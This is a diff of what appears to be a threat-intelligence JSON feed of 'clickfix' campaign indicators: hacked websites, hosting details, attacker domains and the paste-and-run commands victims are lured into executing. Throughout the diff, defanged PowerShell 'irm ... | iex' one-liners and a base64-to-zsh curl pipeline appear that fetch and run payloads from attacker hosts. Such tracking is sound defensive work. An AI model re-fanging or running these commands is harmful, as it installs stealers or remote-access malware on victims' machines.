@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 4849,
+ "count": 4852,
  "indicators": [
   {
    "indicator": "100porcentopiaui.com.br",
@@ -2459,14 +2459,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -4549,13 +4550,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=70d8|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=70d8|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=1b8d|iex"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=4928|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=4928|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=70d8|iex"
    ],
    "connects_to": [
-    "ubbrobccheck20.cc",
-    "verifyidentrob01.cc"
+    "verifyidentrob01.cc",
+    "ubbrobccheck20.cc"
    ],
    "lure_from": []
   },
@@ -8317,6 +8318,55 @@
    "lure_from": []
   },
   {
+   "indicator": "abogadotraficobarcelona.com",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-02",
+   "last_seen": "2026-11-02",
+   "last_online": "2026-11-02",
+   "offline_since": null,
+   "url": "https://www.abogadotraficobarcelona.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Tecnocratica Tecnocratica Centro de Datos",
+   "dns": "neodigit.net",
+   "ip": "2a01:a940:446:40::1",
+   "asn": "AS15954",
+   "org": "Tecnocratica Tecnocratica Centro de Datos, S.L., ES",
+   "country": "ES",
+   "ips": [
+    {
+     "ip": "2a01:a940:446:40::1",
+     "asn": "AS15954",
+     "org": "Tecnocratica Tecnocratica Centro de Datos, S.L., ES",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-02"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.abogadotraficobarcelona.com",
+     "status": "online",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-02"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//trustchecknes[.]com/Girya/[id]')|iex"
+   ],
+   "connects_to": [
+    "trustchecknes.com"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
+  },
+  {
    "indicator": "absurd.africa",
    "type": "domain",
    "category": "clickfix",
@@ -10379,18 +10429,11 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "92.113.16.147",
+   "ip": "2a02:4780:84:f2e2:8f44:3d2c:e95d:8da2",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "DE",
+   "country": "CY",
    "ips": [
-    {
-     "ip": "92.113.16.147",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-02"
-    },
     {
      "ip": "2.57.91.35",
      "asn": "AS47583",
@@ -10424,6 +10467,13 @@
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-10-31",
+     "last_seen": "2026-11-02"
+    },
+    {
+     "ip": "92.113.16.147",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
      "last_seen": "2026-11-02"
     },
     {
@@ -12358,14 +12408,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -27429,6 +27480,7 @@
    "actor_link": null,
    "commands": [
     "irm 'ncheck-brows[.]beer/[id]'|iex;",
+    "irm 'ncheck-brows[.]beer/[id]'|iex",
     "irm 'id-verfied.boats/[id]'|iex;"
    ],
    "connects_to": [
@@ -44505,7 +44557,7 @@
    "product": null,
    "hosting": "OVHcloud",
    "dns": "OVH",
-   "ip": "2001:41d0:1:1b00:213:186:33:87",
+   "ip": "213.186.33.87",
    "asn": "AS16276",
    "org": "OVH OVH SAS, FR",
    "country": "FR",
@@ -54990,15 +55042,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=ed2e|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=ed2e|iex</span>"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=246e|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=246e|iex</span>",
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=ed2e|iex"
    ],
    "connects_to": [
+    "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
    ],
-   "lure_from": [
-    "ubbrobccheck20.cc"
-   ]
+   "lure_from": []
   },
   {
    "indicator": "clenbuterol-for-sale.com",
@@ -56367,15 +56419,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=b6e9|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=b6e9|iex</span>"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=8eab|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=8eab|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=b6e9|iex"
    ],
    "connects_to": [
+    "verifyidentrob01.cc",
     "ubbrobccheck20.cc"
    ],
-   "lure_from": [
-    "verifyidentrob01.cc"
-   ]
+   "lure_from": []
   },
   {
    "indicator": "coaba.net",
@@ -58309,13 +58361,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=58c2|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=58c2|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=c1e7|iex"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=7f76|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=7f76|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=58c2|iex"
    ],
    "connects_to": [
-    "ubbrobccheck20.cc",
-    "verifyidentrob01.cc"
+    "verifyidentrob01.cc",
+    "ubbrobccheck20.cc"
    ],
    "lure_from": []
   },
@@ -58495,9 +58547,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1e7b|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1e7b|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=1834|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=436d|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=436d|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1e7b|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc",
@@ -87036,8 +87088,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=7d4c|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=7d4c|iex</span>"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=8b3c|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=8b3c|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=7d4c|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc"
@@ -88888,13 +88941,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
     "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustrest.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -89435,6 +89490,68 @@
    ],
    "lure_from": [
     "codes.caffe-img.com"
+   ]
+  },
+  {
+   "indicator": "florence-wischer-avocat.com",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-01",
+   "last_seen": "2026-11-02",
+   "last_online": "2026-11-02",
+   "offline_since": null,
+   "url": "https://www.florence-wischer-avocat.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "OVHcloud",
+   "dns": "OVH",
+   "ip": "51.91.236.193",
+   "asn": "AS16276",
+   "org": "OVH OVH SAS, FR",
+   "country": "FR",
+   "ips": [
+    {
+     "ip": "2001:41d0:301::28",
+     "asn": "AS16276",
+     "org": "OVH OVH SAS, FR",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-02"
+    },
+    {
+     "ip": "51.91.236.193",
+     "asn": "AS16276",
+     "org": "OVH OVH SAS, FR",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-02"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.florence-wischer-avocat.com",
+     "status": "online",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-02"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex",
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]')|iex"
+   ],
+   "connects_to": [
+    "lepafonso.bz",
+    "hagosuro.lc",
+    "t-trustrest.com",
+    "xorados.com",
+    "trek-72.com"
+   ],
+   "lure_from": [
+    "interseq.at"
    ]
   },
   {
@@ -102579,12 +102696,12 @@
    "commands": [
     "irm 'id-verfied.boats/[id]'|iex;",
     "irm 'code[.]nvc-info[.]beer/[id]'|iex;",
-    "irm 'ncheck-brows[.]beer/[id]'|iex;"
+    "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
     "code.nvc-info.beer",
-    "id-verfied.boats",
     "ncheck-brows.beer",
+    "id-verfied.boats",
     "jscdncloude.beer",
     "cloud-browse.codes"
    ],
@@ -102830,6 +102947,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'ncheck-brows[.]beer/[id]'|iex",
     "irm 'ncheck-brows[.]beer/[id]'|iex;"
    ],
    "connects_to": [
@@ -120333,16 +120451,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=4c2b|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=4c2b|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=b18a|iex"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=833b|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=833b|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=4c2b|iex"
    ],
    "connects_to": [
-    "ubbrobccheck20.cc"
-   ],
-   "lure_from": [
+    "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
-   ]
+   ],
+   "lure_from": []
   },
   {
    "indicator": "isd.adv.br",
@@ -128324,8 +128441,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=a95c|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=a95c|iex</span>"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=d7d9|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=d7d9|iex</span>",
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=a95c|iex"
    ],
    "connects_to": [
     "verifyidentrob01.cc"
@@ -130335,15 +130453,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=90d0|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=90d0|iex</span>"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=cda9|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=cda9|iex</span>",
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=90d0|iex"
    ],
    "connects_to": [
+    "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
    ],
-   "lure_from": [
-    "ubbrobccheck20.cc"
-   ]
+   "lure_from": []
   },
   {
    "indicator": "kenwilson-sports.com",
@@ -131363,9 +131481,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=dbef|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=dbef|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=e337|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=d0b5|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=d0b5|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=dbef|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc"
@@ -132109,9 +132227,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=e75d|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=e75d|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=0a60|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=2302|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=2302|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=e75d|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc"
@@ -132790,9 +132908,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=c3a3|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=c3a3|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=4cbf|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=4d35|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=4d35|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=c3a3|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc"
@@ -133728,16 +133846,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=0d5c|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=0d5c|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=b72a|iex"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=3d61|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=3d61|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=0d5c|iex"
    ],
    "connects_to": [
-    "ubbrobccheck20.cc"
-   ],
-   "lure_from": [
+    "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
-   ]
+   ],
+   "lure_from": []
   },
   {
    "indicator": "korowater.com",
@@ -135330,8 +135447,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=85dd|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=85dd|iex</span>"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6528|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6528|iex</span>",
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=85dd|iex"
    ],
    "connects_to": [
     "verifyidentrob01.cc"
@@ -135497,16 +135615,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=4083|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=4083|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=51ae|iex"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6f73|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6f73|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=4083|iex"
    ],
    "connects_to": [
-    "ubbrobccheck20.cc"
-   ],
-   "lure_from": [
+    "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
-   ]
+   ],
+   "lure_from": []
   },
   {
    "indicator": "labmadechemonline.com",
@@ -137147,7 +137264,7 @@
    "last_seen": "2026-11-02",
    "last_online": "2026-11-02",
    "offline_since": null,
-   "url": "https://lebaneseamericansociety.org/",
+   "url": "http://lebaneseamericansociety.org/",
    "brand": null,
    "product": null,
    "hosting": "Newfold (Bluehost / HostGator)",
@@ -138186,9 +138303,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=477d|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=477d|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=7c80|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=faca|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=faca|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=477d|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc",
@@ -140064,9 +140181,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=92dd|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=92dd|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=6b33|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=da56|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=da56|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=92dd|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc"
@@ -143873,8 +143990,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=6684|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=6684|iex</span>"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=e8ba|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=e8ba|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=6684|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc"
@@ -144511,16 +144629,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=6e49|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=6e49|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=3137|iex"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=4c9a|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=4c9a|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=6e49|iex"
    ],
    "connects_to": [
-    "ubbrobccheck20.cc"
-   ],
-   "lure_from": [
+    "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
-   ]
+   ],
+   "lure_from": []
   },
   {
    "indicator": "malagabordados.com",
@@ -150071,9 +150188,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1297|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1297|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=1312|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=6090|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=6090|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1297|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc",
@@ -158742,9 +158859,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=9e8f|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=9e8f|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=527f|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=805b|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=805b|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=9e8f|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc",
@@ -159332,13 +159449,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=7df2|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=7df2|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=c66d|iex"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=9bb4|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=9bb4|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=7df2|iex"
    ],
    "connects_to": [
-    "ubbrobccheck20.cc",
-    "verifyidentrob01.cc"
+    "verifyidentrob01.cc",
+    "ubbrobccheck20.cc"
    ],
    "lure_from": []
   },
@@ -161029,14 +161146,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -161131,13 +161249,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=eac2|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=eac2|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=4ad2|iex"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=ccca|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=ccca|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=eac2|iex"
    ],
    "connects_to": [
-    "ubbrobccheck20.cc",
-    "verifyidentrob01.cc"
+    "verifyidentrob01.cc",
+    "ubbrobccheck20.cc"
    ],
